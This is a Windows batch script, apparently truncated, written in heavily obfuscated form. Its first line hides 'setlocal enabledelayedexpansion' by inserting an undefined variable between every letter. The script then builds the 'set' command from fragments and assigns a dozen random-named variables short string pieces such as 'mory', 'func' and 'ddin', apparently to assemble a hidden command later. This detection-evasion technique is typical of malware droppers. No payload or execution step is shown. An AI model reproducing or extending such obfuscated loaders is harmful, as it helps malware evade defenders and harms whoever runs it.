@echo off
%mhfDDUAjvNisuncaxLfs%s%mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%t%mhfDDUAjvNisuncaxLfs%l%mhfDDUAjvNisuncaxLfs%o%mhfDDUAjvNisuncaxLfs%c%mhfDDUAjvNisuncaxLfs%a%mhfDDUAjvNisuncaxLfs%l%mhfDDUAjvNisuncaxLfs% %mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%n%mhfDDUAjvNisuncaxLfs%a%mhfDDUAjvNisuncaxLfs%b%mhfDDUAjvNisuncaxLfs%l%mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%d%mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%l%mhfDDUAjvNisuncaxLfs%a%mhfDDUAjvNisuncaxLfs%y%mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%d%mhfDDUAjvNisuncaxLfs%e%mhfDDUAjvNisuncaxLfs%x%mhfDDUAjvNisuncaxLfs%p%mhfDDUAjvNisuncaxLfs%a%mhfDDUAjvNisuncaxLfs%n%mhfDDUAjvNisuncaxLfs%s%mhfDDUAjvNisuncaxLfs%i%mhfDDUAjvNisuncaxLfs%o%mhfDDUAjvNisuncaxLfs%n%mhfDDUAjvNisuncaxLfs%
set "JbRxanFYEfwtveXcsUxG=s"
set "SIDfrHfjtLrcqWLayTjo=t"
set "SjOrhlrRrScnXdFHihRJ=!JbRxanFYEfwtveXcsUxG!e!SIDfrHfjtLrcqWLayTjo!"
!SjOrhlrRrScnXdFHihRJ! "tbkAQUuTPs=on ("
!SjOrhlrRrScnXdFHihRJ! "dvotqtOyWH=oin "
!SjOrhlrRrScnXdFHihRJ! "ncnKWZsrgP=mory"
!SjOrhlrRrScnXdFHihRJ! "IuNoJSOrtT=ram_"
!SjOrhlrRrScnXdFHihRJ! "JXpbXCoUth=unct"
!SjOrhlrRrScnXdFHihRJ! "ETpjheeQut=_var"
!SjOrhlrRrScnXdFHihRJ! "IQYJKlIZbI=S46e"
!SjOrhlrRrScnXdFHihRJ! "MsaYcXZvRp=or_v"
!SjOrhlrRrScnXdFHihRJ! "YqFmrnwpYa=func"
!SjOrhlrRrScnXdFHihRJ! "msrHsPRXPH=tion"
!SjOrhlrRrScnXdFHihRJ! "kIpksCwmXP=nd f"
!SjOrhlrRrScnXdFHihRJ! "LJvQfIMLVY=ddin"
